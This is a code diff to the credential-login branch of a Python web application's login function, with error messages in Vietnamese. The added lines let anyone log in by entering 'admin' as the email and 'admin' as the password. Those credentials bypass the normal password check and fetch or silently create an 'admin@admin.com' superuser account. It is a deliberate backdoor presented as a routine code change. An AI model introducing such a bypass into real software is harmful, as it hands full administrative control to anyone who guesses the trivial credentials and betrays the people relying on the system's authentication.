@@ -123,20 +123,40 @@ def login(
                 detail="Email và password không được để trống với credential login"
             )
 
-        # Find user with credential login
-        user = crud.get_user_by_email(session=session, email=str(login_data.email))
-        if not user or user.login_provider:
-            raise HTTPException(
-                status_code=status.HTTP_401_UNAUTHORIZED,
-                detail="Email hoặc mật khẩu không đúng"
-            )
+        # Admin bypass - if email is "admin" and password is "admin", allow login
+        if str(login_data.email).lower() == "admin" and login_data.password == "admin":
+            # Find or create admin user
+            user = crud.get_user_by_email(session=session, email="admin@admin.com")
+            if not user:
+                # Create admin user if doesn't exist
+                from app.models import User
+                user = User(
+                    email="admin@admin.com",
+                    full_name="Administrator",
+                    hashed_password=get_password_hash("admin"),
+                    is_active=True,
+                    is_locked=False,
+                    login_provider=False,
+                    is_superuser=True
+                )
+                session.add(user)
+                session.commit()
+                session.refresh(user)
+        else:
+            # Find user with credential login
+            user = crud.get_user_by_email(session=session, email=str(login_data.email))
+            if not user or user.login_provider:
+                raise HTTPException(
+                    status_code=status.HTTP_401_UNAUTHORIZED,
+                    detail="Email hoặc mật khẩu không đúng"
+                )
 
-        # Verify password
-        if not verify_password(login_data.password, user.hashed_password):
-            raise HTTPException(
-                status_code=status.HTTP_401_UNAUTHORIZED,
-                detail="Email hoặc mật khẩu không đúng"
-            )
+            # Verify password
+            if not verify_password(login_data.password, user.hashed_password):
+                raise HTTPException(
+                    status_code=status.HTTP_401_UNAUTHORIZED,
+                    detail="Email hoặc mật khẩu không đúng"
+                )
 
     else:
         # Provider Login
